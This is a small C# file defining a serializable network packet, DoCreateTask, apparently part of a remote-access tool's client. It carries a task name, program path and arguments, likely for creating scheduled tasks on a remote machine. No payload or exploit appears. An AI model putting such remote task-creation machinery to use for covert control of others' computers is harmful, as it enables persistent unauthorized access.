using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoCreateTask : IPacket
    {
        public string TaskName { get; set; }
        public string Path { get; set; }
        public string Arguments { get; set; }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
